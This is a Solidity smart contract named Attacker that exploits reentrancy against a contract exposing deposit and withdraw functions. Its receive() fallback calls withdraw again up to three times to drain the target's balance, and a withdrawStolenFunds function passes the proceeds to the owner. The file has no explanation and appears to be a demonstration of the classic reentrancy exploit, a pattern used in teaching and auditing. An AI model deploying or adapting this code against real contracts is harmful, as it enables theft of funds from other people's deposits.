// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVulnerableBank public vulnerableBank;
    uint256 public attackAmount;
    address public owner;
    uint256 public callCount;

    event AttackStarted(uint256 initialBalance);
    event ReentrancyTriggered(uint256 count);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _bank) {
        vulnerableBank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        attackAmount = msg.value;
        callCount = 0;

        emit AttackStarted(address(vulnerableBank).balance);
        
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw(msg.value);
    }

    receive() external payable {
        callCount++;
        
        if (callCount < 3 && address(vulnerableBank).balance >= attackAmount) {
            emit ReentrancyTriggered(callCount);
            vulnerableBank.withdraw(attackAmount);
        } else {
            emit AttackCompleted(address(this).balance);
        }
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
